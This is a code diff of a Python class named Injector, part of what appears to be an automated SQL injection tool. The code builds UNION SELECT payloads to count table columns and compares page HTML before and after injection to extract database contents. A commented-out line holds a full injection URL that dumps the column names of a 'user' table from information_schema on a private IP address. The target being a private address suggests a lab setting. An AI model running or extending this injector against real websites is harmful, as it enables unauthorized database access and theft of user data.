@@ -11,19 +11,21 @@ class Injector:
     
     # Pass dict of options as param flags
     def __init__(self, flags):
+        """ Receives strings from builder to inject and passes off output to parser.
+            :flags:
+        """
         self.flags = flags 
         self.offset = 0 # can be changed to say, self.offset, if 1,2,3,4... found on page a lot
         self.columns_upper_limit_guess = 9
-        self.delimiter = '/**/' #Can also be '%20'
         self.scan = scanner.Scanner()
     
-    # Diff two html lists by turning into sets and taking difference.
-    # First param should be before injection, 2nd param after.
-    # Returns list representing difference between the two pages.
     def html_diff(self, before_injection, after_injection):
-        diff = list(set(after_injection) - set(before_injection))
-
-        return diff
+        """ Diffs two lits of HTML.
+            :before_injection: HTML without SQLI
+            :after_injection: HTML with SQLI
+            :returns: list of strings representing difference (hopefully captures SQLI info)
+        """
+        return list(set(after_injection) - set(before_injection))
     
     # Try unions until no SQL errors returned.
     # Return number of columns in exposed table.
@@ -64,7 +66,7 @@ class Injector:
         """
         
         # Make query string
-        union_urls = ['%20' + str(i + self.offset) for i in xrange(1, self.get_num_columns(page) + 1)]
+        union_urls = builder.Builder(page, []).union_nums(self.get_num_columns(page))
         new_url = page.split('=')[0] + '=null' + '%20UNION%20SELECT' + ",".join(union_urls)
 
         diff = self.html_diff(self.scan.page(page), self.scan.page(new_url))
@@ -86,7 +88,7 @@ class Injector:
             data[query] = (self.html_diff(default_page, self.scan.page(queries[query])))
 
         #print queries['user table']
-        print (self.html_diff(default_page, self.scan.page("http://192.168.83.134/?id=null%20%20UNION%20SELECT%201,%202,%203,%204,%205,%206,%20column_name%20from%20information_schema.columns%20where%20table_name%20=%20'user'")))
+        #print (self.html_diff(default_page, self.scan.page("http://192.168.83.134/?id=null%20%20UNION%20SELECT%201,%202,%203,%204,%205,%206,%20column_name%20from%20information_schema.columns%20where%20table_name%20=%20'user'")))
 
         return data
     
